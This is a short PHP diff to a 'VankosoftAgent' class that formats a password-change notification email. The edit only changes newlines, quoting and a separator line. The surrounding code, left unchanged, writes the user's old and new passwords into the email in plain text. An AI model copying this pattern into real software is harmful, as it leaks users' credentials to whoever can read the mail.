@@ -52,9 +52,9 @@ final class VankosoftAgent
         $mailSubject    = \sprintf( "[VankoSoft Agent] Password Changed for User: '%s'", $changedUser->getUsername() );
         
         $mailText       = \sprintf( "Password Changed for User: '%s'\n", $changedUser->getUsername() );
-        $mailText       .= \sprintf( "The user created this change: '%s'\n\n", $fromUser->getUsername() );
-        $mailText       .= '==============================================================================================';
-        $mailText       .= '\n\n';
+        $mailText       .= \sprintf( "The user created this change: '%s'\n", $fromUser->getUsername() );
+        $mailText       .= "====================================================================";
+        $mailText       .= "\n\n";
         $mailText       .= \sprintf( "Old Password: '%s'\n", $oldPassword );
         $mailText       .= \sprintf( "New Password: '%s'\n", $newPassword );
         
